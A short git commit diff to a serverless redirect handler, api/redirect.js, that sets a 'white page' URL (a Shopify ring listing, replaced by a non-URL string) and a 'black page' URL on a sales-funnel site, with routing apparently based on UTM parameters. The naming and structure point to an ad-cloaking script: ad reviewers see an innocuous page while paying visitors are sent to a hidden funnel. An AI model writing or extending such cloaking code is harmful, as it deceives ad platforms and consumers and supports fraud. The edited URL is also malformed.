8dd0ac21bc92b6d317ecd918b53471d4149b9f4e
Asif-Moon <asifaslam.ch94@gmail.com>
2025-02-25 03:58:12 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://newshejewellery.myshopify.com/products/newshe-wedding-band-engagement-ring-set-for-women-925-sterling-silver-1-8ct-round-white-aaaaa-cz-size-3-13";
+    const whitePageURL = "stylesbynopegoat";
     const blackPageURL = "https://adffuaorrd.myfunnelish.com/jj-dd-spr-1738364604529104-1738364997483090-1739239513447558-1740098104992791-1740256142894750";
   
     // Parse the UTM parameters from the request URL
